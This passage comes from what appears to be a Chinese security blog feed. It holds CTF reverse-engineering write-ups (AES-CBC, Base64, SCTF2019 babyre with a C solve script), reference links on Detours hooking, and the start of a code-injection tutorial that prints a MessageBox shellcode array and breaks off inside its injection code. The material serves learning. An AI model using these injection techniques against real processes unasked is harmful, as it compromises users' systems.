src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335524731.png" alt></p><p>对于这种在输入开始前的反调试，采用attach to process</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335425994.png" alt="反调试"></p><p>可以看到如果不是调试状态，就将数据强制转为函数指针</p><p>这里已经解密完并执行完程序了</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335630803.png" alt></p><p>对其交叉引用可以看到</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335692377.png" alt></p><h3 id="AES-CBC、Base64加密"><a class="header-anchor" href="#AES-CBC、Base64加密">¶</a>AES-CBC、Base64加密</h3><p>动调发现这就是加密函数</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336067526.png" alt></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336317921.png" alt="AES-CBC"></p><p>可以知道该函数就是初始化密钥</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336575248.png" alt></p><p>从这里的明文异或结合CBC可以知道是CBC模式</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337171206.png" alt="明文异或"></p><p>key和iv分别为sycloversyclover、sctfsctfsctfsctf</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336622490.png" alt="iv"></p><p>这里很多this指针，但是我们还是可以通过一些特征以及FindCrypt发现这是AES中的key的初始化</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336696808.png" alt></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336732282.png" alt="轮常量异或"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336808010.png" alt="S表替换"></p><p>AES-CBC加密</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337454010.png" alt="明文与iv向量的异或"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337280514.png" alt="内部加密"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336891802.png" alt="base64"></p><p>进入该函数中，明显是base64加密</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336933402.png" alt></p><p>找到码表，发现没有被改过</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336989928.png" alt></p><h3 id="比较-v2"><a class="header-anchor" href="#比较-v2">¶</a>比较</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337016203.png" alt></p><h2 id="解密"><a class="header-anchor" href="#解密">¶</a>解密</h2><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337028435.png" alt></p><h1 id="SCTF2019-babyre"><a class="header-anchor" href="#SCTF2019-babyre">¶</a>SCTF2019-babyre</h1><h2 id="考点-v6"><a class="header-anchor" href="#考点-v6">¶</a>考点</h2><p>base64解密、Maze、移位与异或、花指令</p><h2 id="分析-v6"><a class="header-anchor" href="#分析-v6">¶</a>分析</h2><p>花指令就不说了，全部都是一样的，去除即可</p><p>迷宫也没啥说的，注意这里是三维迷宫 <strong>ddwwxxssxaxwwaasasyywwdd</strong></p><h3 id="base64解密"><a class="header-anchor" href="#base64解密">¶</a>base64解密</h3><p>可以看到这里先将我们的输入去table找索引，然后&amp;0x3F取出最后的六位，按位与上v5左移6，这样就得到了8位的字符，加上=4的判断，类似于base64的解密操作</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650339409043.png" alt></p><p>直接将最后的字符串加密即可<strong>c2N0Zl85MTAy</strong></p><h3 id="换位异或"><a class="header-anchor" href="#换位异或">¶</a>换位异或</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340193709.png" alt></p><p>加密流程：每四个输入存入int型的变量，然后进行xor_enc加密，将前四个字符加密后存放到第四个字符的后一个字符，依次往后。</p><blockquote><p><strong>之所以要这样进行移位是因为如果强制转为int型，由于小端序，存储的时候是12345678，这样int取出的时候就变成了4321</strong></p></blockquote><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340446709.png" alt="xor_enc"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340461185.png" alt></p><p>xor_enc加密流程：将第二第三第四个字符进行异或，分为四个字节去table找到对应的值，然后重新组合成int型，再经过一系列左移右移异或操作并返回，再将返回值与第一个字符异或，这样就得到了一个加密后的结果，这里要一直等到index&lt;=29，也就是前四个字符不会加密</p><p>我们可以看到这里v10只有26，那么26、27、28、29下标的v10就赋值给了v11、v12、v13、v14</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340936262.png" alt></p><p>取出最后四个int型存储的十六个字节，存储到enc_flag数组，然后比较</p><blockquote><p><strong>假设int a=0x12345678,那么HIBYTE(a)=0x12,BYTE2(a)=0x34,BYTE1(a)=0x56</strong></p></blockquote><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340991543.png" alt></p><p>这样我们就知道了最后的四个int型的元素，往前推，29是怎么来的呢，是flag[25]<sup>enc(flag[26],flag[27],flag[28])得到的，所以flag[29]</sup>enc(flag[26],flag[27],flag[28])即可得到flag[25]，前面的元素同理</p><h2 id="脚本-v5"><a class="header-anchor" href="#脚本-v5">¶</a>脚本</h2><p>因为涉及了ida的左右移位操作，而ida目录下defs.h有定义，所以可以直接引用</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"defs.h"</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v3[<span class="number">273</span>] = {</span><br><span class="line">    <span class="number">0x000000D6</span>, <span class="number">0x00000090</span>, <span class="number">0x000000E9</span>, <span class="number">0x000000FE</span>, <span class="number">0x000000CC</span>, <span class="number">0x000000E1</span>, <span class="number">0x0000003D</span>, <span class="number">0x000000B7</span>,</span><br><span class="line">    <span class="number">0x00000016</span>, <span class="number">0x000000B6</span>, <span class="number">0x00000014</span>, <span class="number">0x000000C2</span>, <span class="number">0x00000028</span>, <span class="number">0x000000FB</span>, <span class="number">0x0000002C</span>, <span class="number">0x00000005</span>,</span><br><span class="line">    <span class="number">0x0000002B</span>, <span class="number">0x00000067</span>, <span class="number">0x0000009A</span>, <span class="number">0x00000076</span>, <span class="number">0x0000002A</span>, <span class="number">0x000000BE</span>, <span class="number">0x00000004</span>, <span class="number">0x000000C3</span>,</span><br><span class="line">    <span class="number">0x000000AA</span>, <span class="number">0x00000044</span>, <span class="number">0x00000013</span>, <span class="number">0x00000026</span>, <span class="number">0x00000049</span>, <span class="number">0x00000086</span>, <span class="number">0x00000006</span>, <span class="number">0x00000099</span>,</span><br><span class="line">    <span class="number">0x0000009C</span>, <span class="number">0x00000042</span>, <span class="number">0x00000050</span>, <span class="number">0x000000F4</span>, <span class="number">0x00000091</span>, <span class="number">0x000000EF</span>, <span class="number">0x00000098</span>, <span class="number">0x0000007A</span>,</span><br><span class="line">    <span class="number">0x00000033</span>, <span class="number">0x00000054</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000043</span>, <span class="number">0x000000ED</span>, <span class="number">0x000000CF</span>, <span class="number">0x000000AC</span>, <span class="number">0x00000062</span>,</span><br><span class="line">    <span class="number">0x000000E4</span>, <span class="number">0x000000B3</span>, <span class="number">0x0000001C</span>, <span class="number">0x000000A9</span>, <span class="number">0x000000C9</span>, <span class="number">0x00000008</span>, <span class="number">0x000000E8</span>, <span class="number">0x00000095</span>,</span><br><span class="line">    <span class="number">0x00000080</span>, <span class="number">0x000000DF</span>, <span class="number">0x00000094</span>, <span class="number">0x000000FA</span>, <span class="number">0x00000075</span>, <span class="number">0x0000008F</span>, <span class="number">0x0000003F</span>, <span class="number">0x000000A6</span>,</span><br><span class="line">    <span class="number">0x00000047</span>, <span class="number">0x00000007</span>, <span class="number">0x000000A7</span>, <span class="number">0x000000FC</span>, <span class="number">0x000000F3</span>, <span class="number">0x00000073</span>, <span class="number">0x00000017</span>, <span class="number">0x000000BA</span>,</span><br><span class="line">    <span class="number">0x00000083</span>, <span class="number">0x00000059</span>, <span class="number">0x0000003C</span>, <span class="number">0x00000019</span>, <span class="number">0x000000E6</span>, <span class="number">0x00000085</span>, <span class="number">0x0000004F</span>, <span class="number">0x000000A8</span>,</span><br><span class="line">    <span class="number">0x00000068</span>, <span class="number">0x0000006B</span>, <span class="number">0x00000081</span>, <span class="number">0x000000B2</span>, <span class="number">0x00000071</span>, <span class="number">0x00000064</span>, <span class="number">0x000000DA</span>, <span class="number">0x0000008B</span>,</span><br><span class="line">    <span class="number">0x000000F8</span>, <span class="number">0x000000EB</span>, <span class="number">0x0000000F</span>, <span class="number">0x0000004B</span>, <span class="number">0x00000070</span>, <span class="number">0x00000056</span>, <span class="number">0x0000009D</span>, <span class="number">0x00000035</span>,</span><br><span class="line">    <span class="number">0x0000001E</span>, <span class="number">0x00000024</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000005E</span>, <span class="number">0x00000063</span>, <span class="number">0x00000058</span>, <span class="number">0x000000D1</span>, <span class="number">0x000000A2</span>,</span><br><span class="line">    <span class="number">0x00000025</span>, <span class="number">0x00000022</span>, <span class="number">0x0000007C</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000001</span>, <span class="number">0x00000021</span>, <span class="number">0x00000078</span>, <span class="number">0x00000087</span>,</span><br><span class="line">    <span class="number">0x000000D4</span>, <span class="number">0x00000000</span>, <span class="number">0x00000046</span>, <span class="number">0x00000057</span>, <span class="number">0x0000009F</span>, <span class="number">0x000000D3</span>, <span class="number">0x00000027</span>, <span class="number">0x00000052</span>,</span><br><span class="line">    <span class="number">0x0000004C</span>, <span class="number">0x00000036</span>, <span class="number">0x00000002</span>, <span class="number">0x000000E7</span>, <span class="number">0x000000A0</span>, <span class="number">0x000000C4</span>, <span class="number">0x000000C8</span>, <span class="number">0x0000009E</span>,</span><br><span class="line">    <span class="number">0x000000EA</span>, <span class="number">0x000000BF</span>, <span class="number">0x0000008A</span>, <span class="number">0x000000D2</span>, <span class="number">0x00000040</span>, <span class="number">0x000000C7</span>, <span class="number">0x00000038</span>, <span class="number">0x000000B5</span>,</span><br><span class="line">    <span class="number">0x000000A3</span>, <span class="number">0x000000F7</span>, <span class="number">0x000000F2</span>, <span class="number">0x000000CE</span>, <span class="number">0x000000F9</span>, <span class="number">0x00000061</span>, <span class="number">0x00000015</span>, <span class="number">0x000000A1</span>,</span><br><span class="line">    <span class="number">0x000000E0</span>, <span class="number">0x000000AE</span>, <span class="number">0x0000005D</span>, <span class="number">0x000000A4</span>, <span class="number">0x0000009B</span>, <span class="number">0x00000034</span>, <span class="number">0x0000001A</span>, <span class="number">0x00000055</span>,</span><br><span class="line">    <span class="number">0x000000AD</span>, <span class="number">0x00000093</span>, <span class="number">0x00000032</span>, <span class="number">0x00000030</span>, <span class="number">0x000000F5</span>, <span class="number">0x0000008C</span>, <span class="number">0x000000B1</span>, <span class="number">0x000000E3</span>,</span><br><span class="line">    <span class="number">0x0000001D</span>, <span class="number">0x000000F6</span>, <span class="number">0x000000E2</span>, <span class="number">0x0000002E</span>, <span class="number">0x00000082</span>, <span class="number">0x00000066</span>, <span class="number">0x000000CA</span>, <span class="number">0x00000060</span>,</span><br><span class="line">    <span class="number">0x000000C0</span>, <span class="number">0x00000029</span>, <span class="number">0x00000023</span>, <span class="number">0x000000AB</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000053</span>, <span class="number">0x0000004E</span>, <span class="number">0x0000006F</span>,</span><br><span class="line">    <span class="number">0x000000D5</span>, <span class="number">0x000000DB</span>, <span class="number">0x00000037</span>, <span class="number">0x00000045</span>, <span class="number">0x000000DE</span>, <span class="number">0x000000FD</span>, <span class="number">0x0000008E</span>, <span class="number">0x0000002F</span>,</span><br><span class="line">    <span class="number">0x00000003</span>, <span class="number">0x000000FF</span>, <span class="number">0x0000006A</span>, <span class="number">0x00000072</span>, <span class="number">0x0000006D</span>, <span class="number">0x0000006C</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000051</span>,</span><br><span class="line">    <span class="number">0x0000008D</span>, <span class="number">0x0000001B</span>, <span class="number">0x000000AF</span>, <span class="number">0x00000092</span>, <span class="number">0x000000BB</span>, <span class="number">0x000000DD</span>, <span class="number">0x000000BC</span>, <span class="number">0x0000007F</span>,</span><br><span class="line">    <span class="number">0x00000011</span>, <span class="number">0x000000D9</span>, <span class="number">0x0000005C</span>, <span class="number">0x00000041</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000010</span>, <span class="number">0x0000005A</span>, <span class="number">0x000000D8</span>,</span><br><span class="line">    <span class="number">0x0000000A</span>, <span class="number">0x000000C1</span>, <span class="number">0x00000031</span>, <span class="number">0x00000088</span>, <span class="number">0x000000A5</span>, <span class="number">0x000000CD</span>, <span class="number">0x0000007B</span>, <span class="number">0x000000BD</span>,</span><br><span class="line">    <span class="number">0x0000002D</span>, <span class="number">0x00000074</span>, <span class="number">0x000000D0</span>, <span class="number">0x00000012</span>, <span class="number">0x000000B8</span>, <span class="number">0x000000E5</span>, <span class="number">0x000000B4</span>, <span class="number">0x000000B0</span>,</span><br><span class="line">    <span class="number">0x00000089</span>, <span class="number">0x00000069</span>, <span class="number">0x00000097</span>, <span class="number">0x0000004A</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000096</span>, <span class="number">0x00000077</span>, <span class="number">0x0000007E</span>,</span><br><span class="line">    <span class="number">0x00000065</span>, <span class="number">0x000000B9</span>, <span class="number">0x000000F1</span>, <span class="number">0x00000009</span>, <span class="number">0x000000C5</span>, <span class="number">0x0000006E</span>, <span class="number">0x000000C6</span>, <span class="number">0x00000084</span>,</span><br><span class="line">    <span class="number">0x00000018</span>, <span class="number">0x000000F0</span>, <span class="number">0x0000007D</span>, <span class="number">0x000000EC</span>, <span class="number">0x0000003A</span>, <span class="number">0x000000DC</span>, <span class="number">0x0000004D</span>, <span class="number">0x00000020</span>,</span><br><span class="line">    <span class="number">0x00000079</span>, <span class="number">0x000000EE</span>, <span class="number">0x0000005F</span>, <span class="number">0x0000003E</span>, <span class="number">0x000000D7</span>, <span class="number">0x000000CB</span>, <span class="number">0x00000039</span>, <span class="number">0x00000048</span>,</span><br><span class="line">    <span class="number">0x000000C6</span>, <span class="number">0x000000BA</span>, <span class="number">0x000000B1</span>, <span class="number">0x000000A3</span>, <span class="number">0x00000050</span>, <span class="number">0x00000033</span>, <span class="number">0x000000AA</span>, <span class="number">0x00000056</span>,</span><br><span class="line">    <span class="number">0x00000097</span>, <span class="number">0x00000091</span>, <span class="number">0x0000007D</span>, <span class="number">0x00000067</span>, <span class="number">0x000000DC</span>, <span class="number">0x00000022</span>, <span class="number">0x00000070</span>, <span class="number">0x000000B2</span>,</span><br><span class="line">};</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">encode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> xor_final)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> v2 = (v3[BYTE2(xor_final)] &lt;&lt; <span class="number">16</span>) | v3[(<span class="keyword">unsigned</span> __int8)xor_final] | (v3[BYTE1(xor_final)] &lt;&lt; <span class="number">8</span>) | (v3[HIBYTE(xor_final)] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    <span class="keyword">return</span> __ROL4__(v2, <span class="number">12</span>) ^ (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(__ROL4__(v2, <span class="number">8</span>) ^ __ROR4__(v2, <span class="number">2</span>)) ^ __ROR4__(v2, <span class="number">6</span>);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">unsigned</span> v10[<span class="number">30</span>] = { <span class="number">0</span> };</span><br><span class="line">    v10[<span class="number">26</span>] = <span class="number">0xBE040680</span>;</span><br><span class="line">    v10[<span class="number">27</span>] = <span class="number">0xC5AF7647</span>;</span><br><span class="line">    v10[<span class="number">28</span>] = <span class="number">0x9FCC401F</span>;</span><br><span class="line">    v10[<span class="number">29</span>] = <span class="number">0xD8BF92EF</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">25</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">    {</span><br><span class="line">        v10[i] = v10[i + <span class="number">4</span>] ^ encode(v10[i + <span class="number">1</span>]^v10[i + <span class="number">2</span>]^v10[i + <span class="number">3</span>]);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c%c%c%c"</span>,((<span class="keyword">char</span>*)(&amp;v10[i]))[<span class="number">0</span>], ((<span class="keyword">char</span>*)(&amp;v10[i]))[<span class="number">1</span>], ((<span class="keyword">char</span>*)(&amp;v10[i]))[<span class="number">2</span>], ((<span class="keyword">char</span>*)(&amp;v10[i]))[<span class="number">3</span>]);</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650342054912.png" alt></p><p>这样子就不会存在int型读取时小端序的问题</p><h1 id><a class="header-anchor" href="#">¶</a></h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;Buuctf刷题记录&lt;/p&gt;</summary>
    
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Detours学习</title>
    <link href="https://gift1a.github.io/2022/04/15/Detours%E5%AD%A6%E4%B9%A0/"/>
    <id>https://gift1a.github.io/2022/04/15/Detours%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-04-15T07:26:14.000Z</published>
    <updated>2022-04-24T01:37:54.871Z</updated>
    
    <content type="html"><![CDATA[<p>Detourd学习</p><span id="more"></span> <h1 id="0x00-参考"><a class="header-anchor" href="#0x00-参考">¶</a>0x00-参考</h1><p><a href="https://blog.csdn.net/jyl_sh/article/details/120855998">https://blog.csdn.net/jyl_sh/article/details/120855998</a></p><p><a href="https://blog.csdn.net/z971130192/article/details/100565010">https://blog.csdn.net/z971130192/article/details/100565010</a></p><p><a href="https://blog.csdn.net/z971130192/article/details/100565398">https://blog.csdn.net/z971130192/article/details/100565398</a></p><p><a href="https://blog.csdn.net/z971130192/article/details/100671576">https://blog.csdn.net/z971130192/article/details/100671576</a></p>]]></content>
    
    
    <summary type="html">Detours</summary>
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/categories/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>API钩取技术</title>
    <link href="https://gift1a.github.io/2022/04/15/API%E9%92%A9%E5%8F%96%E6%8A%80%E6%9C%AF/"/>
    <id>https://gift1a.github.io/2022/04/15/API%E9%92%A9%E5%8F%96%E6%8A%80%E6%9C%AF/</id>
    <published>2022-04-15T06:28:13.000Z</published>
    <updated>2022-04-20T01:21:38.511Z</updated>
    
    
    <summary type="html">API钩取技术</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>使用汇编语言编写注入代码</title>
    <link href="https://gift1a.github.io/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/"/>
    <id>https://gift1a.github.io/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/</id>
    <published>2022-04-14T08:03:09.000Z</published>
    <updated>2022-04-20T05:39:42.656Z</updated>
    
    <content type="html"><![CDATA[<p>代码注入-汇编</p><span id="more"></span> <h1 id="0x00-设置"><a class="header-anchor" href="#0x00-设置">¶</a>0x00-设置</h1><p>修改EIP</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649925411946.png" alt></p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649925229842.png" alt></p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649925283278.png" alt="关闭自动填充nop"></p><h1 id="0x01-修改汇编"><a class="header-anchor" href="#0x01-修改汇编">¶</a>0x01-修改汇编</h1><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649926048838.png" alt></p><p>输入字符串，Ctrl+E修改，注意字符串以0结尾，最后要加上00</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649926227498.png" alt></p><p>可以发现得到的是汇编代码，OD会自动识别</p><p>只需要选中字符串按下Ctrl+A即可转为字符串</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649926333629.png" alt></p><p>同理修改好www.reversecore.com字符串</p><h2 id="提取汇编"><a class="header-anchor" href="#提取汇编">¶</a>提取汇编</h2><p>接下来将插入的asm的机器码进行复制（在内存窗口中复制对应长度的十六进制数据），并修改格式</p><p>得到</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> shellcode[] = {</span><br><span class="line"><span class="number">0x55</span>,<span class="number">0x8B</span>,<span class="number">0xEC</span>,<span class="number">0x8B</span>,<span class="number">0x75</span>,<span class="number">0x08</span>,<span class="number">0x68</span>,<span class="number">0x6C</span>,<span class="number">0x6C</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x68</span>,<span class="number">0x33</span>,<span class="number">0x32</span>,<span class="number">0x2E</span>,<span class="number">0x64</span></span><br><span class="line">,<span class="number">0x68</span>,<span class="number">0x75</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x54</span>,<span class="number">0xFF</span>,<span class="number">0x16</span>,<span class="number">0x68</span>,<span class="number">0x6F</span>,<span class="number">0x78</span>,<span class="number">0x41</span>,<span class="number">0x00</span>,<span class="number">0x68</span>,<span class="number">0x61</span>,<span class="number">0x67</span></span><br><span class="line">,<span class="number">0x65</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x4D</span>,<span class="number">0x65</span>,<span class="number">0x73</span>,<span class="number">0x73</span>,<span class="number">0x54</span>,<span class="number">0x50</span>,<span class="number">0xFF</span>,<span class="number">0x56</span>,<span class="number">0x04</span>,<span class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0xE8</span>,<span class="number">0x0C</span></span><br><span class="line">,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x52</span>,<span class="number">0x65</span>,<span class="number">0x76</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x43</span>,<span class="number">0x6F</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x00</span>,<span class="number">0xE8</span></span><br><span class="line">,<span class="number">0x14</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x77</span>,<span class="number">0x77</span>,<span class="number">0x77</span>,<span class="number">0x2E</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x76</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x63</span></span><br><span class="line">,<span class="number">0x6F</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x2E</span>,<span class="number">0x63</span>,<span class="number">0x6F</span>,<span class="number">0x6D</span>,<span class="number">0x00</span>,<span class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0xFF</span>,<span class="number">0xD0</span>,<span class="number">0x33</span>,<span class="number">0xC0</span>,<span class="number">0x8B</span>,<span class="number">0xE5</span></span><br><span class="line">,<span class="number">0x5D</span>,<span class="number">0xC3</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h1 id="0x02-代码实现-v2"><a class="header-anchor" href="#0x02-代码实现-v2">¶</a>0x02-代码实现</h1><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 